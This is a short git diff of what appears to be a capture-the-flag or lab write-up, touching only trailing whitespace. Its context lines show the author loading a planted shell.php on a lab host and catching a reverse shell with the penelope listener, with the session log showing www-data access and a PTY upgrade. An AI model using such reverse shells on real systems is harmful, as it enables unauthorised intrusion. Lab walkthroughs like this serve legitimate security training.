@@ -122,13 +122,13 @@ kali@kali:penelope -p 4444
 Navigate to "*http://10.49.176.116/shell.php*".
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                    
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from osboxes~10.49.176.116-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/osboxes~10.49.176.116-Linux-x86_64/2026_02_16-14_39_57-669.log 📜
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@osboxes:/var/www/html$ 
